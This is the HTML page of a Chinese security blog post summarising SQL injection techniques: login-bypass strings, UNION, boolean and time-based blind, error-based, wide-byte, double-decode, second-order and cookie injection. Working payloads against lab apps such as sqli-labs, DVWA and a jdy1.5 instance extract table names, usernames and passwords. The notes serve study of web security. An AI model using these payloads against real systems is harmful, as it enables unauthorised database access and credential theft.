@@ -1,0 +1,936 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="sql注入,">
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="Cancrie's blog." type="application/atom+xml">
+
+
+
+
+
+
+<meta name="description" content="一.sql注入漏洞原理：（1）有一个参数用户可控； （2）服务器对该参数没有过滤或者过滤不够严谨； 本质:把用户输入的数据and1=1当作代码执行，违背了“数据与代码分离”的原则 条件：用户能控制输入的内容 web应用把用户输入的内容带入到数据库中执行（不过滤或者过滤不严谨） 危害：读取数据库的数据 修改或者删除数据 getshell  往服务器读取文件 二.万能密码传入SQL语句可控参数分为两类">
+<meta name="keywords" content="sql注入">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sql注入小结">
+<meta property="og:url" content="http://yoursite.com/2019/04/11/sql注入小结/index.html">
+<meta property="og:site_name" content="Cancrie&#39;s blog.">
+<meta property="og:description" content="一.sql注入漏洞原理：（1）有一个参数用户可控； （2）服务器对该参数没有过滤或者过滤不够严谨； 本质:把用户输入的数据and1=1当作代码执行，违背了“数据与代码分离”的原则 条件：用户能控制输入的内容 web应用把用户输入的内容带入到数据库中执行（不过滤或者过滤不严谨） 危害：读取数据库的数据 修改或者删除数据 getshell  往服务器读取文件 二.万能密码传入SQL语句可控参数分为两类">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2019-07-14T11:27:53.539Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="sql注入小结">
+<meta name="twitter:description" content="一.sql注入漏洞原理：（1）有一个参数用户可控； （2）服务器对该参数没有过滤或者过滤不够严谨； 本质:把用户输入的数据and1=1当作代码执行，违背了“数据与代码分离”的原则 条件：用户能控制输入的内容 web应用把用户输入的内容带入到数据库中执行（不过滤或者过滤不严谨） 危害：读取数据库的数据 修改或者删除数据 getshell  往服务器读取文件 二.万能密码传入SQL语句可控参数分为两类">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2019/04/11/sql注入小结/">
+
+
+
+
+
+  <title>sql注入小结 | Cancrie's blog.</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Cancrie's blog.</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/04/11/sql注入小结/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Cancrie">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Cancrie's blog.">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">sql注入小结</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-04-11T21:56:32+08:00">
+                2019-04-11
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/web/" itemprop="url" rel="index">
+                    <span itemprop="name">web</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="一-sql注入漏洞"><a href="#一-sql注入漏洞" class="headerlink" title="一.sql注入漏洞"></a>一.sql注入漏洞</h1><h5 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h5><p>（1）有一个参数用户可控；</p>
+<p>（2）服务器对该参数没有过滤或者过滤不够严谨；</p>
+<h5 id="本质"><a href="#本质" class="headerlink" title="本质:"></a>本质:</h5><p>把用户输入的数据and1=1当作代码执行，违背了“数据与代码分离”的原则</p>
+<h5 id="条件："><a href="#条件：" class="headerlink" title="条件："></a>条件：</h5><p>用户能控制输入的内容</p>
+<p>web应用把用户输入的内容带入到数据库中执行（不过滤或者过滤不严谨）</p>
+<h5 id="危害："><a href="#危害：" class="headerlink" title="危害："></a>危害：</h5><p>读取数据库的数据</p>
+<p>修改或者删除数据</p>
+<p>getshell </p>
+<p>往服务器读取文件</p>
+<h1 id="二-万能密码"><a href="#二-万能密码" class="headerlink" title="二.万能密码"></a>二.万能密码</h1><p>传入SQL语句可控参数分为两类 </p>
+<ol>
+<li><p>数字类型，参数不用被引号括起来，如?id=1 </p>
+</li>
+<li><p>其他类型，参数要被引号扩起来,如?name=”phone”</p>
+</li>
+</ol>
+<p>常见万能密码：</p>
+<p><code>1&#39; or 1=1#</code></p>
+<p><code>1&#39; or &#39;a&#39;=&#39;a&#39;#</code></p>
+<p><code>admin&#39; or 1=1-- -</code></p>
+<p><code>&quot;or &quot;a&quot;=&quot;a</code><br><code>&#39;)or(&#39;a&#39;=&#39;a</code><br><code>or 1=1--</code><br><code>&#39;or 1=1--</code><br><code>a&#39;or&#39; 1=1--</code><br><code>&quot;or 1=1--</code><br><code>&#39;or&#39;a&#39;=&#39;a</code><br><code>&quot;or&quot;=&quot;a&#39;=&#39;a</code><br><code>&#39;or&#39;&#39;=&#39;</code><br><code>&#39;or&#39;=&#39;or&#39;</code><br><code>1 or &#39;1&#39;=&#39;1&#39;=1</code><br><code>1 or &#39;1&#39;=&#39;1&#39; or 1=1</code></p>
+<h1 id="三-手工注入"><a href="#三-手工注入" class="headerlink" title="三.手工注入"></a>三.手工注入</h1><h5 id="1-常用函数："><a href="#1-常用函数：" class="headerlink" title="1.常用函数："></a>1.常用函数：</h5><p>user()用户    </p>
+<p>version()版本    </p>
+<p>database()数据库 </p>
+<p>concat(str1,str2,…) 没有分隔符地连接字符串 </p>
+<p>concat_ws(separator,str1,str2,…) 含有分隔符地连接字符串 </p>
+<p>group_concat(str1,str2,…)连接一个组的所有字符串，并以逗号分隔每一条数据 </p>
+<p>mid()  适用于mysql  </p>
+<p>substr()  适用于oracle  mysql sqlserver</p>
+<p>substring()  适用于mysql sqlserver</p>
+<p>left()</p>
+<p>right()</p>
+<p>length(字符串) 计算字符串长度</p>
+<p>ascii(s)返回字符串 s 的第一个字符的 ASCII 码。</p>
+<p>@@tmpdir   临时文件夹</p>
+<p>@@datadir  数据库文件所在的位置</p>
+<h5 id="2-数据库中注释："><a href="#2-数据库中注释：" class="headerlink" title="2.数据库中注释："></a>2.<strong>数据库中注释：</strong></h5><p>#(%23)    – +</p>
+<h5 id="3-库名表名字段名"><a href="#3-库名表名字段名" class="headerlink" title="3.库名表名字段名"></a>3.库名表名字段名</h5><p>information_schema 自带，系统库，汇总（其他数据库的库名，表名，字段名）</p>
+<p>columns表中，需要关注该表中三个字段：</p>
+<p>table_schema 其他数据库的库名</p>
+<p>table_name     其他数据库的表名</p>
+<p>column_name 其他数据库中字段名</p>
+<h5 id="4-步骤"><a href="#4-步骤" class="headerlink" title="4.步骤"></a>4.步骤</h5><p>step 1：判断是否有注入（判断从后台数据库中选取的列数，判断哪几列从 前端显示）</p>
+<p>step 2：收集数据库信息（用户名、版本、当前数据库名等等）</p>
+<p>step 3：获取当前数据库下的所有表名</p>
+<p>step 4：获取当前数据库下指定表中字段名</p>
+<p>step 5：获取字段对应的数据</p>
+<p>step 6：破解数据，登录系统，getshell，提权，内网渗透</p>
+<h1 id="四-union联合查询注入"><a href="#四-union联合查询注入" class="headerlink" title="四.union联合查询注入"></a>四.union联合查询注入</h1><p>UNION 操作符用于合并两个或多个 SELECT 语句的结果集。</p>
+<p>UNION 内部的 SELECT 语句必须拥有相同数量的列。</p>
+<p>列也必须拥有相似的数据类型。同时，每条 SELECT 语句中的 列的顺序必须相同。 </p>
+<p><strong>SQL UNION 语法</strong> </p>
+<p><code>SELECT column_name(s) FROM table_name1</code></p>
+<p><code>UNION</code></p>
+<p><code>SELECT column_name(s) FROM table_name2</code></p>
+<p>注释：默认地，UNION 操作符选取不同的值。如果允许重复的值，请使用 UNION ALL。 </p>
+<p><strong>SQL UNION ALL 语法</strong> </p>
+<p><code>SELECT column_name(s) FROM table_name1</code></p>
+<p><code>UNION ALL</code></p>
+<p><code>SELECT column_name(s) FROM table_name2</code></p>
+<p>另外，UNION 结果集中的列名总是等于 UNION 中第一个 SELECT 语句中的列名。 </p>
+<p>Union all 与 union 的区别是增加了去重的功能。</p>
+<p><strong>eg</strong></p>
+<h6 id="1-收集信息："><a href="#1-收集信息：" class="headerlink" title="1.收集信息："></a>1.收集信息：</h6><p>所有数据库</p>
+<p>​    <code>http://192.168.10.18/jdy1.5/typeid.php?typeid=-1 UNION ALL SELECT 1,(select group_concat(distinct table_schema)  from information_schema.columns),3,4,5%23</code></p>
+<p>当前数据库</p>
+<p>​    <code>http://192.168.10.18/jdy1.5/typeid.php?typeid=-1 UNION ALL SELECT 1,(database()),3,4,5%23</code></p>
+<h6 id="2-获取当前数据库下表名"><a href="#2-获取当前数据库下表名" class="headerlink" title="2.获取当前数据库下表名"></a>2.获取当前数据库下表名</h6><p><code>http://192.168.10.18/jdy1.5/typeid.php?typeid=-1 UNION ALL SELECT 1,(select group_concat(distinct table_name)  from information_schema.columns  where table_schema=database()),3,4,5%23</code></p>
+<h6 id="3-获取当前数据库下指定表的字段名"><a href="#3-获取当前数据库下指定表的字段名" class="headerlink" title="3.获取当前数据库下指定表的字段名"></a>3.获取当前数据库下指定表的字段名</h6><p>sql语句：</p>
+<p><code>select group_concat(distinct column_name ) from information_schema.columns where table_schema=database() and table_name=0x6a64795f61646d696e;</code></p>
+<p>注入语句：</p>
+<p><code>http://192.168.10.18/jdy1.5/typeid.php?typeid=-1 UNION ALL SELECT 1,(select group_concat(distinct column_name ) from information_schema.columns where table_schema=database() and table_name=0x6a64795f61646d696e),3,4,5%23</code></p>
+<h6 id="4-获取字段数据"><a href="#4-获取字段数据" class="headerlink" title="4.获取字段数据"></a>4.获取字段数据</h6><p><code>http://192.168.10.18/jdy1.5/typeid.php?typeid=-1 UNION ALL SELECT 1,(select concat_ws(0x7e,username,password) from jdy_admin limit 0,1),3,4,5%23</code></p>
+<h1 id="五-盲注"><a href="#五-盲注" class="headerlink" title="五.盲注"></a>五.盲注</h1><p>盲注就是在 sql 注入过程中，sql 语句执行的选择后，用户提交的数据在后台数据库中执行，没有任何数据（报错信息、执行sql的数据）传递到前端。这种类型就是盲注。</p>
+<p>分类：</p>
+<p>1.使用基于布尔的盲注    使用bool–&gt;页面是否显示正常</p>
+<p>2.基于时间的盲注           使用time–&gt;页面加载时间</p>
+<p>利用这些方法并结合浏览器的显示效果判断payload的正确性</p>
+<h4 id="基于布尔的盲注探测"><a href="#基于布尔的盲注探测" class="headerlink" title="基于布尔的盲注探测"></a>基于布尔的盲注探测</h4><p><strong>step 1：探测注入点</strong>，’     / 1’ an 1=1 #   /1 ‘ and ‘1’=1’#</p>
+<p>SELECT * FROM users WHERE id=’1’</p>
+<p><code>http://192.168.11.94/sqli-labs-master/Less-8/?id=1&#39; and 1=1--+</code></p>
+<p><code>http://192.168.11.94/sqli-labs-master/Less-8/?id=1&#39; and 1=2--+</code></p>
+<p>注意：用户提交的数据被带入到后台数据库中执行了，根据页面的显示效果判断此处是否有注入点</p>
+<p><strong>step 2：收集数据库信息</strong>（当前用户名，当前数据库……）</p>
+<p><code>http://192.168.11.94/sqli-labs-master/Less-8/?id=1&#39;and length(user())=14%23</code></p>
+<p>用户名长度14</p>
+<p><code>http://192.168.11.94/sqli-labs-master/Less-8/?id=1&#39;and ascii(substr(user(),1,1))=114%23</code></p>
+<p>用户名第一个字符是r</p>
+<p><strong>step 3：查询当前数据库中的表名</strong></p>
+<p><code>http://192.168.11.94/sqli-labs-master/Less-8/?id=1&#39;and ascii(substr((select distinct table_name from information_schema.columns where table_schema=database() limit 0,1),1,1)=114 %23</code> </p>
+<p> 0  0-5    1：1-20表长吧 114  33-127</p>
+<p>用burp suite跑，得emails</p>
+<p>找出有价值的数据表users</p>
+<p><strong>step 4：获取指定表的字段名</strong></p>
+<p><code>http://192.168.11.94/sqli-labs-master/Less-8/?id=1&#39;and ascii(substr((select distinct column_name from information_schema.columns where table_name=0x7573657273 and table_schema=database() limit 0,1),1,1)=114 %23</code></p>
+<p><strong>step 5：获取字段数据</strong></p>
+<p><code>http://192.168.11.94/sqli-labs-master/Less-8/?id=1&#39;and ascii(substr((select group_concat(username,password) from users limit 0,1),1,1)=114 %23</code></p>
+<p>跑burp</p>
+<h4 id="基于时间的盲注"><a href="#基于时间的盲注" class="headerlink" title="基于时间的盲注"></a>基于时间的盲注</h4><p>函数：</p>
+<p>​    sleep() benchmark() 要与条件类函数配置使用</p>
+<p>​    sleep(参数) 参数直接写以秒为单位的时间数字  sleep(5) </p>
+<p>​    返回值是0</p>
+<p>​    <code>select *  from users where id=1 and select if(1=1,sleep(5),&#39;bye&#39;);</code></p>
+<p>​    benchmark(参数1，参数2) 参数1 表示执行某项操作的次数  参数2 某项操作，函数或者表达式</p>
+<p>​    <code>select if(length(user())&gt;4,benchmark(5000000,md5(&#39;abc&#39;)),&#39;bye&#39;)</code></p>
+<p>实验操作：</p>
+<p>​    <strong>step 1 ：找注入点</strong></p>
+<p>​    <strong>step 2：数据库信息</strong></p>
+<p>​        当前数据库长度：</p>
+<p>​        <code>select *  from users where id=1 and select if(length（database()）=4,sleep(5),&#39;bye&#39;);</code></p>
+<p>​        探测数据库名的每个字符：</p>
+<p>​        <code>select *  from users where id=1 and select if(ascii(subtring(database(),1,1))=107,1,sleep(5));</code></p>
+<p>​        dvwa</p>
+<p>​    <strong>step 3:获取数据库中的表</strong></p>
+<p>​        <code>select *  from users where id=1 and select if((ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)))&gt;100,1,sleep(5));</code></p>
+<p>​    <strong>step 4:获取字段名</strong></p>
+<p>​        <code>select *  from users where id=1 and select if((ascii(substr((select column_name from information_schema.columns where table_name=&#39;users&#39;and  table_schema=database() limit 0,1),1,1)))&gt;100,1,sleep(5));</code></p>
+<p>​    <strong>step 5：获取字段内容</strong></p>
+<p>​        select *  from users where id=1 and select if((ascii(substr(( select password from users limit 0,1),1,1)))=68</p>
+<p>,1,sleep(5));</p>
+<h1 id="六-报错注入"><a href="#六-报错注入" class="headerlink" title="六.报错注入"></a>六.报错注入</h1><p>报错函数：</p>
+<p>（1）extractvalue(参数1,参数2)</p>
+<p>从目标XML中返回查询的字符串，参数1是string格式，XML文档名，参数2是XPATH格式，要查询的字符串</p>
+<p><code>select extractvalue(1,concat(0x7e,(select user()),0x7e));</code></p>
+<p>  (2)updatexml(参数1，参数2，参数3)</p>
+<p>改变文档中符合条件的节点的值，参数1是xml文档，参数2是XPATH的字符串，参数3是string格式，替换，查找符合条件的数据</p>
+<p><code>select updatexml(1,concat(0x7e,(select user()),0x7e),1)</code></p>
+<p>（3）floor()函数，必须和count() rand() group by 配合才能报错</p>
+<p><code>select * from news where tid=1 and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a)</code></p>
+<p>达到相同目的的函数都可以替换去使用</p>
+<p><code>(select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)</code></p>
+<p><code>select count(*),(root@localhost0)x from information_schema.tables group by x</code></p>
+<p><code>select concat(user(),floor(rand(0)*2))x;</code></p>
+<p>floor()返回参数的整数部分</p>
+<p>floor报错本质：</p>
+<p>创建虚拟表格时，执行主键查询两次出错！！</p>
+<p><strong>通过floor报错的方法来爆数据的本质是group by语句的报错。group by语句报错的原因是floor(random(0)*2)的不确定性，即可能为0也可能为1（group by key的原理是循环读取数据的每一行，将结果保存于临时表中。读取每一行的key时，如果key存在于临时表中，则不在临时表中则更新临时表中的数据；如果该key不存在于临时表中，则在临时表中插入key所在行的数据。group by floor(random(0)*2)出错的原因是key是个随机数，检测临时表中key是否存在时计算了一下floor(random(0)*2)可能为0，如果此时临时表只有key为1的行不存在key为0的行，那么数据库要将该条记录插入临时表，由于是随机数，插时又要计算一下随机值，此时floor(random(0)*2)结果可能为1，就会导致插入时冲突而报错。即检测时和插入时两次计算了随机数的值。</strong></p>
+<p>其他7种报错函数：</p>
+<p>​      （1）geometrycollection（）</p>
+<p><code>select * from news where tid=1 and geometrycollection((select * from (select * from (select user())a)b));</code></p>
+<p>​    (2)multipoint()函数</p>
+<p><code>select * from test where id=1 and multipoint((select * from(select * from(select user())a)b));</code></p>
+<p>​        (3)polygon()函数</p>
+<p><code>select * from test where id=1 and polygon((select * from(select * from(select user())a)b));</code></p>
+<p>​    (4)multipolygon()函数</p>
+<p><code>select * from test where id=1 and multipolygon((select * from(select * from(select user())a)b));</code></p>
+<p>​    (5)linestring()函数</p>
+<p><code>select * from test where id=1 and linestring((select * from(select * from(select user())a)b));</code></p>
+<p>​    (6)multilinestring()函数</p>
+<p><code>select * from test where id=1 and multilinestring((select * from(select * from(select user())a)b));</code></p>
+<p>​    (7)exp()函数</p>
+<p><code>select * from test where id=1 and exp(~(select * from(select user())a));</code></p>
+<p>报错本质：有回显（联合、报错）</p>
+<p>实验演示：</p>
+<p><code>select extractvalue(1,concat(0x7e,(select user()),0x7e));</code></p>
+<p><strong>step 1:测试注入点</strong></p>
+<p><strong>step 2：获取数据库信息（当前数据库）</strong></p>
+<p><code>select extractvalue(1,concat(0x7e,(select database()),0x7e));</code></p>
+<p><code>http://192.168.10.18/SQLI_LAB/Less-5/?id=1&#39; and  extractvalue(1,concat(0x7e,(database()),0x7e))--+</code></p>
+<p><strong>step 3:表名</strong></p>
+<p><code>and extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e))#</code></p>
+<p><code>http://127.0.0.1/sqli-labs-master/Less-5/?id=1 &#39; and extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 2,1),0x7e))--+</code></p>
+<p><strong>step 4：字段名</strong></p>
+<p><code>http://127.0.0.1/sqli-labs-master/Less-5/?id=1 &#39; and extractvalue(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&#39;user&#39; and table_schema=database() limit 2,1),0x7e))--+</code></p>
+<p><strong>step 5:字段内容</strong></p>
+<p><code>http://127.0.0.1/sqli-labs-master/Less-5/?id=1 &#39; and extractvalue(1,concat(0x7e,(select concat(username,&#39;|&#39;,password) from users limit 0,1),0x7e))--+</code></p>
+<h1 id="七-宽字节注入"><a href="#七-宽字节注入" class="headerlink" title="七.宽字节注入"></a>七.宽字节注入</h1><p>常见的转义函数：</p>
+<p>​    <code>addslaches()</code></p>
+<p>​    <code>mysql_real_escape_string()</code></p>
+<p>​    <code>mysql_escape_string()</code>   <strong>注意：php5.3以及之后就废除</strong></p>
+<p>​    魔数引号GPC模块  magic_quotes_gpc</p>
+<p>​    对特殊字符进行转义 ‘    “  \   NULL等</p>
+<p>​                     \’  \”  \  \</p>
+<p>mysql_real_escape_string() 不会对%  和 _转义 </p>
+<p>gbk编码：GB2312的一个扩展，使用两个字节编码一个汉字 8140-FEFE</p>
+<p>漏洞原因：</p>
+<p>​    数据库采用GBK编码</p>
+<p>​    对用户输入的数据进行转义</p>
+<p><code>http://127.0.0.1/kuanzijie?id=&#39;1%df&#39;&#39;</code></p>
+<p><code>http://127.0.0.1/kuanzijie?id=&#39;1%df\&#39;&#39;</code></p>
+<p><code>http://127.0.0.1/kuanzijie?id=1%df%5c&#39;</code></p>
+<p><code>http://127.0.0.1/kuanzijie?id=&#39;1運&#39;&#39;</code></p>
+<p>PDO宽字节</p>
+<p>1.数据库使用GBK编码</p>
+<p>2.使用转义函数，如addslaches()</p>
+<p>3.PHP版本&lt;5.3.6 使用PDO连接数据库，设置编码方式GBK，没有参数过滤，存在SQL注入</p>
+<p>宽字节的防御：（代码层防御）</p>
+<p>对宽字节编码的最好的修补方法：</p>
+<p>（1）使用mysql_Set_charset(GBK)</p>
+<p>（2）使用mysql_real_escape_string()转义参数</p>
+<h1 id="八-二次解码注入"><a href="#八-二次解码注入" class="headerlink" title="八.二次解码注入"></a>八.二次解码注入</h1><p> PHP中常用过滤函数如</p>
+<p>addslashes()、mysql_real_escape_string()、mysql_escape_string()</p>
+<p>或者使用魔术引号GPC开关来防止注入，原理都是给单引号（’）、双引号（”）、反斜杠（\）和NULL等特殊字符前面加上反斜杠来进行转义。</p>
+<p>但是这些函数在遇到urldecode()函数时，就会因为二次解码引发注入。</p>
+<p>urldecode()函数是对已编码的URL进行解码。</p>
+<p>引发注入的原因其实很简单，PHP本身在处理提交的数据之前会进行一次解码，</p>
+<p>例如/test.php?id=1这个URL，我们构造字符串/test.php?id=1%2527，PHP第一次解码，%25解码成了%，于是url变成了/test.php?id=%27；</p>
+<p>然后urldecode()函数又进行了一次解码，%27解码成了’，于是最终URL变成了/test.php?id=1’，单引号引发了注入。rawurldecode()也会产生同样的问题</p>
+<h1 id="九-二次注入"><a href="#九-二次注入" class="headerlink" title="九.二次注入"></a>九.二次注入</h1><p>是指已存储的数据（脏数据）在被读取后再次进入到SQL查询语句中导致的注入</p>
+<p>原理：</p>
+<p>第一次在进行数据库插入数据的时候，仅仅使用addslashes()或者魔数引号GPC,对其中的特殊数据进行转义，存在入数据的时候保留其原来的格式，也即还是脏数据。在下一次进行需要进行查询的时候，直接从数据库中取出了脏数据，没有进行进一步的检验和处理，取来这些脏数据放在sql语句中去查询，这样就会造成SQL的二次注入</p>
+<h1 id="十-HTTP头部注入"><a href="#十-HTTP头部注入" class="headerlink" title="十.HTTP头部注入"></a>十.HTTP头部注入</h1><p>cookie注入</p>
+<p>$_POST[]</p>
+<p>$_GET[]</p>
+<p>$_REQUEST[]</p>
+<p>post和get方式被过滤，只能通过cookie方式注入</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/sql注入/" rel="tag"># sql注入</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/04/06/ubuntu-create-vpn服务器/" rel="next" title="ubuntu_create_vpn服务器">
+                <i class="fa fa-chevron-left"></i> ubuntu_create_vpn服务器
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">Cancrie</p>
+              <p class="site-description motion-element" itemprop="description">网络安全</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">6</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">1</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">5</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#一-sql注入漏洞"><span class="nav-number">1.</span> <span class="nav-text">一.sql注入漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#原理："><span class="nav-number">1.0.0.0.1.</span> <span class="nav-text">原理：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#本质"><span class="nav-number">1.0.0.0.2.</span> <span class="nav-text">本质:</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#条件："><span class="nav-number">1.0.0.0.3.</span> <span class="nav-text">条件：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#危害："><span class="nav-number">1.0.0.0.4.</span> <span class="nav-text">危害：</span></a></li></ol></li></ol><li class="nav-item nav-level-1"><a class="nav-link" href="#二-万能密码"><span class="nav-number">2.</span> <span class="nav-text">二.万能密码</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#三-手工注入"><span class="nav-number">3.</span> <span class="nav-text">三.手工注入</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#1-常用函数："><span class="nav-number">3.0.0.0.1.</span> <span 